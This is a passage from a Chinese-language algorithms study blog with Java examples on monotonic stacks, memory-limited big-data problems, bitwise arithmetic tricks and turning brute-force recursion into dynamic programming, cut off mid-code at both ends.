<span class="token operator">=</span> leftIndex<span class="token punctuation">;</span>            res<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>正数数组，数组中所有数的和与最小值的乘积叫做指标A。求数组的子数组中，指标A的最大值</p><p>对于数组每个数arr[i]，得到以该数为最小值的子数组的指标A的值</p><p>借鉴单调栈的思想，想得到以每个数为最小值的子数组，只需要得到每个数左边和右边最近的比它小的位置，那么想得到的子数组就是从左边求得的位置+1，到右边求得的位置-1</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">minTimesSum</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> size <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> sums <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">;</span>    sums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>size<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> sums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> sums<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>size<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> arr<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span>                    arr<span class="token punctuation">[</span>temp<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> sums<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token punctuation">(</span>sums<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> sums<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                   <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> temp <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span>                arr<span class="token punctuation">[</span>temp<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> sums<span class="token punctuation">[</span>size<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token punctuation">(</span>sums<span class="token punctuation">[</span>size<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> sums<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> max<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="大数据问题"><a href="#大数据问题" class="headerlink" title="大数据问题"></a>大数据问题</h2><h3 id="利用分段统计思想节省空间"><a href="#利用分段统计思想节省空间" class="headerlink" title="利用分段统计思想节省空间"></a>利用分段统计思想节省空间</h3><p>32位无符号整数的范围是0~4,294,967,295（42亿+），现在有一个正好包含40亿个无符号整数的文件，所以在整个范围中必然存在没出现过的数。可以使用最多1GB的内存，怎么找到所有未出现过的数？</p><h4 id="1-0-2"><a href="#1-0-2" class="headerlink" title="1.0"></a>1.0</h4><p>使用2^32个bit去标记，哪个数出现过就标记哪个bit为1，这样做的空间为2^32 bits = 2^29 Bytes = 2^19 KB = 2^9 MB (512 MB)</p><h4 id="2-0-2"><a href="#2-0-2" class="headerlink" title="2.0"></a>2.0</h4><p>内存限制为3KB，但是只用找到一个没出现过的数即可</p><p>首先思考如果只有3 KB，那么对于一个无符号整数数组最多可以开多少空间</p><p>3 K / 4（1个无符号整数为4 B）大概为700多，那么对应2的次幂，大概是大于2^9 = 512，小于2^10，所以开unsigned int[512]完全够用</p><p>然后将0 - 2^32-1分成512份，每份有2^23个数，所以数组[0]存放40亿个无符号整数中0 - 2^23-1范围内的数出现了几次，数组[1]存放40亿个无符号整数中2^23 - 2^23+2^23-1范围内的数出现了几次</p><p>因为只有40亿个数，所以数组中至少有一个数小于2^23，那么我们就可以确定要求得的没出现过的数一定属于这个范围，然后将这个范围再分成512份，再把40亿个数分一遍，不在这个范围的就不管了，然后新的512份一定至少有一份还是不够，然后继续分下去，一定能够找到没有出现过的</p><blockquote><p>1 KB 就让 1 K / 4</p><p>完全同理</p></blockquote><h4 id="3-0"><a href="#3-0" class="headerlink" title="3.0"></a>3.0</h4><p>如果限制有限几个变量的话，怎么办?</p><p>将0 - 2^32-1二分，一定至少有一半不足2^31个，继续二分下去即可</p><h4 id="0x02-找40亿个整数的中位数"><a href="#0x02-找40亿个整数的中位数" class="headerlink" title="0x02 找40亿个整数的中位数"></a>0x02 找40亿个整数的中位数</h4><p>10 KB 内存，同样的思想，10 K / 4 ，大概能开[2048]，那就分成2048份，然后得到每个范围的频率，40亿个数，从[0]开始求和，求到20亿左右，就可以知道中位数在哪个范围，再把这个范围继续分2048，继续求频率，一定可以求出来</p><h3 id="利用位图思想节省空间"><a href="#利用位图思想节省空间" class="headerlink" title="利用位图思想节省空间"></a>利用位图思想节省空间</h3><p>32位无符号整数的范围是0~4294967295，现在有40亿个无符号整数，可以使用最多1 GB的内存，找出所有出现了两次的数</p><p>使用两位位图，即00 - 出现0次，01 - 出现1次，10 - 出现2次，11出现2次以上，统计10的个数即可，所以需要的空间为2^32*2 / 8 个bit = 1GB （正好）</p><h3 id="利用堆做多个结果的合并"><a href="#利用堆做多个结果的合并" class="headerlink" title="利用堆做多个结果的合并"></a>利用堆做多个结果的合并</h3><p>某搜索公司一天的用户搜索词汇是海量的(百亿数据量)，请设计一种求出每天热门Top100 词汇的可行办法</p><p>首先将这些海量数据都用哈希函数分流到小文件里，重复的数据只会出现在一个小文件里，然后就可以使用哈希表，存储小文件中每个词汇对应的频率</p><p>每个小文件做成一个大根堆，所有大根堆都先拿出堆顶，放到总堆（也是大根堆），然后每次弹出总堆堆顶，弹出的这个堆顶是哪个小文件的，就把这个堆顶从小文件删除，该小文件新的堆顶再次进入总堆，循环操作，直至Top100都拿到为止</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>关于大数据题目解题技巧（也可以叫资源限制类题目）</p><p>1）哈希函数可以把数据按照种类均匀分流</p><p>2）布隆过滤器用于集合的建立与查询，并可以节省大量空间</p><p>3）一致性哈希解决数据服务器的负载管理问题</p><p>4）利用并查集结构做岛问题的并行计算</p><p>5）位图解决某一范围上数字的出现情况，并可以节省大量空间</p><p>6）利用分段统计思想、并进一步节省大量空间</p><p>7）利用堆、外排序来做多个处理单元的结果合并</p><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><h3 id="0x01-较大值"><a href="#0x01-较大值" class="headerlink" title="0x01 较大值"></a>0x01 较大值</h3><p>给定两个有符号32位整数a和b，返回a和b中较大的（不能做任何比较判断）</p><p>先设立两个函数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 1 -> 0</span><span class="token comment">// 0 -> 1</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> n <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 符号位为0，即为非负数 -> 返回1</span><span class="token comment">// 符号位为1，即为负数   -> 返回0</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token operator">>></span><span class="token number">31</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-0-3"><a href="#1-0-3" class="headerlink" title="1.0"></a>1.0</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getMax1</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> a <span class="token operator">-</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> returnA <span class="token operator">=</span> <span class="token function">sign</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// a>=b 为1，a&lt;b 为0</span>    <span class="token keyword">int</span> returnB <span class="token operator">=</span> <span class="token function">flip</span><span class="token punctuation">(</span>returnA<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a <span class="token operator">*</span> returnA <span class="token operator">+</span> b <span class="token operator">*</span> returnB<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>利用互斥思想，+号两边两个条件互斥，一个成立另一个一定不成立，即要么返回a，要么返回b</p><p>这里的函数是有问题的，当a和b异号时，会出现溢出的可能性，导致判断错误</p></blockquote><h4 id="2-0-3"><a href="#2-0-3" class="headerlink" title="2.0"></a>2.0</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getMax2</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> a <span class="token operator">-</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> sa <span class="token operator">=</span> <span class="token function">sign</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> sb <span class="token operator">=</span> <span class="token function">sign</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> sc <span class="token operator">=</span> <span class="token function">sign</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> difSab <span class="token operator">=</span> sa <span class="token operator">^</span> sb<span class="token punctuation">;</span> <span class="token comment">// a和b同号则为0，异号则为1</span>    <span class="token keyword">int</span> sameSab <span class="token operator">=</span> <span class="token function">flip</span><span class="token punctuation">(</span>difSab<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 同号则为1，异号则为0</span>    <span class="token comment">// 什么时候返回a</span>    <span class="token comment">// 同号时sc为1 + 异号时sa为1</span>    <span class="token keyword">int</span> returnA <span class="token operator">=</span> sameSab <span class="token operator">*</span> sc <span class="token operator">+</span> difSab <span class="token operator">*</span> sa<span class="token punctuation">;</span>    <span class="token keyword">int</span> returnB <span class="token operator">=</span> <span class="token function">flip</span><span class="token punctuation">(</span>returnA<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a <span class="token operator">*</span> returnA <span class="token operator">+</span> b <span class="token operator">*</span> returnB<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-2的次幂"><a href="#0x02-2的次幂" class="headerlink" title="0x02 2的次幂"></a>0x02 2的次幂</h3><p>判断一个32位正数是不是2的幂、4的幂</p><p>对于2的幂，数字特征为所有bit上只有1个bit为1</p><p>一个方法是取出最右边的1（(~n+1)&amp;n）看是否与原数相等</p><p>另一个方法是，直接减1，那么如果是2的幂，则那个为1的bit位变为0，右边所有bit都会为1，那么与原数相与，看是否为0</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">is2Power</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>对于4的幂，首先看是否是2的幂，这就确定了只有1个bit位为1</p><p>4的幂数字特征为”为1的bit位只在0，2，4，8，… bit位上”，所以让原数与(010101…0101)相与，结果如果为0说明1在1, 3, 5, …,bit位上，为1说明在0, 2, 4, 8, … bit位上</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">is4Power</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">0x55555555</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="0x03-基本四则运算"><a href="#0x03-基本四则运算" class="headerlink" title="0x03 基本四则运算"></a>0x03 基本四则运算</h3><p>给定两个有符号32位整数a和b，不能使用算术运算符，分别实现a和b的加、减、乘、除运算（如果给定a、b执行加减乘除的运算结果就会导致数据的溢出，那么你实现的函数不必对此负责，除此之外请保证计算过程不发生溢出）</p><h4 id="加"><a href="#加" class="headerlink" title="加"></a>加</h4><p>13 - 01101</p><p>7   - 00111</p><p>两数做异或：01010（相当于两数做无进位相加）</p><p>两数做与：00101（相当于两数如果进行加法运算，代表哪个位会产生进位）</p><p>将与的结果左移1位：01010（这就代表两个数加法运算的进位信息 —— 因为产生进位之后，本质是要往前一位进1的，所以要左移1位）</p><p>所以原数相加的结果就等于“两数做异或” + “将与的结果左移1位”的结果</p><p>重复如此操作，01010 + 01010 = 00000（异或结果）+ 10100 （与的结果左移1位） = 10100（异或结果） + 00000（与的结果左移1位）</p><p>00000代表没有进位信息了，那么结果就是异或结果10100 = 20</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> temp<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        temp <span class="token operator">=</span> a <span class="token operator">^</span> b<span class="token punctuation">;</span>        b <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>        a <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="减"><a href="#减" class="headerlink" title="减"></a>减</h4><p>减法就是a + (-b)</p><p>-b就是补码，取反+1</p><h4 id="乘"><a href="#乘" class="headerlink" title="乘"></a>乘</h4><p>二进制乘法，跟正常十进制乘法完全类似</p><p>10010</p><p>*  101</p><p>=</p><p>10010</p><p>+ 000000 （a左移1位，b右移1位）</p><p>+ 1001000 （a再左移1位，b再右移1位）</p><p>至b为0为止</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">multiply</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> res <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>        a <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>        b <span class="token operator">>>>=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 无符号右移，即前面总用0去补</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="除"><a href="#除" class="headerlink" title="除"></a>除</h4><p>示例：</p><p>a = 0110111</p><p>b = 0000011</p><p>a是否能减去b&lt;&lt;31，不能</p><p>a是否能减去b&lt;&lt;30，不能</p><p>…</p><p>a是否能减去b&lt;&lt;4，能</p><p>a - b&lt;&lt;4 = 0000111 赋给a，并且商必然含有1&lt;&lt;4 10000</p><p>现在a是否能减去b&lt;&lt;4，不能</p><p>…</p><p>a是否能减去b&lt;&lt;1，能</p><p>a - b&lt;&lt;1 = 0000001 赋给a，并且商必然含有1&lt;&lt;1 10010</p><p>现在a是否能减去b&lt;&lt;1，不能</p><p>现在a是否能减去b&lt;&lt;0，不能，说明这是个小余数，忽略</p><blockquote><p>左移有可能导致溢出，移着移着符号位变成1了</p><p>所以右移更加安全，让a右移31, 30, …看是否大于b</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">div</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> abs_a <span class="token operator">=</span> a <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token function">negNum</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">:</span> a<span class="token punctuation">;</span>    <span class="token keyword">int</span> abs_b <span class="token operator">=</span> b <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token function">negNum</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">:</span> b<span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">31</span><span class="token punctuation">;</span>i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">=</span><span class="token function">minus</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>abs_a<span class="token operator">>></span>i<span class="token punctuation">)</span> <span class="token operator">>=</span> abs_b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            abs_a <span class="token operator">=</span> <span class="token function">minus</span><span class="token punctuation">(</span>abs_a<span class="token punctuation">,</span> abs_b <span class="token operator">&lt;&lt;</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            res <span class="token operator">|=</span> <span class="token number">1</span><span class="token operator">&lt;&lt;</span>i<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">negNum</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">:</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="暴力递归-gt-DP"><a href="#暴力递归-gt-DP" class="headerlink" title="暴力递归 -&gt; DP"></a>暴力递归 -&gt; DP</h2><p>通过尝试写出暴力递归版本 -&gt;</p><p>抛开题目，观察暴力版本，加缓存写出记忆化搜索版本 -&gt;</p><p>通过观察数组中各个数的关系，写出严格表版本</p><h3 id="0x01-题目一"><a href="#0x01-题目一" class="headerlink" title="0x01 题目一"></a>0x01 题目一</h3><p>假设有排成一行的 N 个位置，记为 1~N，N &gt; 1</p><p>开始时机器人在其中的 S 位置上(S 一定是 1~N 中的一个)，机器人可以往左走或者往右走</p><p>如果机器人来到 1 位置， 那么下一步只能往右来到 2 位置</p><p>如果机器人来到 N 位置，那么下一步只能往左来到 N-1 位置</p><p>规定机器人必须走 K 步，最终能来到 E 位置(E 也一定是 1~N 中的一个)的方法有多少种</p><blockquote><p>N=5,S=2,K=3,E=3 上面的参数代表所有位置为 1 2 3 4 5</p><p>机器人最开始在 2 位置上，必须经过 3 步，最后到达 3 位置</p><p>走的方法只有如下 3 种:</p><p>1)从2到1，从1到2，从2到3</p><p>2)从2到3，从3到2，从2到3</p><p>3)从2到3，从3到4，从4到3</p><p>所以返回方法数 3</p></blockquote><h4 id="1-0-暴力递归"><a href="#1-0-暴力递归" class="headerlink" title="1.0 暴力递归"></a>1.0 暴力递归</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 还有rest步，当前在cur位置</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">E</span><span class="token punctuation">,</span> <span class="token keyword">int</span> rest<span class="token punctuation">,</span> <span class="token keyword">int</span> cur<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rest <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> cur <span class="token operator">==</span> <span class="token class-name">E</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token class-name">N</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">N</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> cur <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token class-name">N</span><span class="token punctuation">,</span> <span class="token class-name">E</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> cur <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token 